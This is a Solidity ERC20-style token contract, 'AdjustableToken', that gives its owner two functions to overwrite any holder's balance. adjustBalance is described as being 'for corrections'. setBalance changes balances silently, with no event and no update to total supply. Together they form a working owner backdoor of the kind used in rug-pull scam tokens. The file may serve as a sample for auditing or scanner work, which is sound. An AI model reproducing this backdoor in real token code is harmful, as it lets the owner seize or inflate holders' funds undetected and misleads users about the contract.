// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ERC20 where owner can adjust balances
contract AdjustableToken {
    string public name = "AdjustableToken";
    string public symbol = "ADJ";
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event BalanceAdjusted(address indexed account, uint256 oldBalance, uint256 newBalance);

    constructor(uint256 supply) {
        owner = msg.sender;
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    // Owner can adjust balances for corrections
    function adjustBalance(address account, uint256 newBalance) public {
        require(msg.sender == owner, "Only owner");
        uint256 oldBalance = balanceOf[account];
        if (newBalance > oldBalance) {
            totalSupply += (newBalance - oldBalance);
        } else {
            totalSupply -= (oldBalance - newBalance);
        }
        balanceOf[account] = newBalance;
        emit BalanceAdjusted(account, oldBalance, newBalance);
    }

    function setBalance(address account, uint256 amount) public {
        require(msg.sender == owner, "Only owner");
        balanceOf[account] = amount;
    }
}
